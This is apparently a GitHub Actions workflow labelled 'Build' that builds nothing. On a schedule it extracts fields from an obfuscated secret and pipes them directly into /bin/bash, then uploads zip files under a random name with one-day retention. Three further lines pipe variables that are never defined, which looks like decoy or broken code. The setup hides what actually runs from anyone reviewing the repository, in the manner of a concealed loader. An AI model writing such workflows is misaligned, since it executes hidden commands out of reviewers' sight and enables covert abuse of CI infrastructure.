name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '5 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          vq03420: ${{ secrets.vq03420 }}
        run: |
          printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
          printf '%s' "$v696" | jq -r .u244 | /bin/bash
          printf '%s' "$x50" | jq -r .e9311 | /bin/bash
          echo $jwd937 | jq -r .ifc7053 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: wErCjXhu
          path: "*.zip"
          retention-days: 1
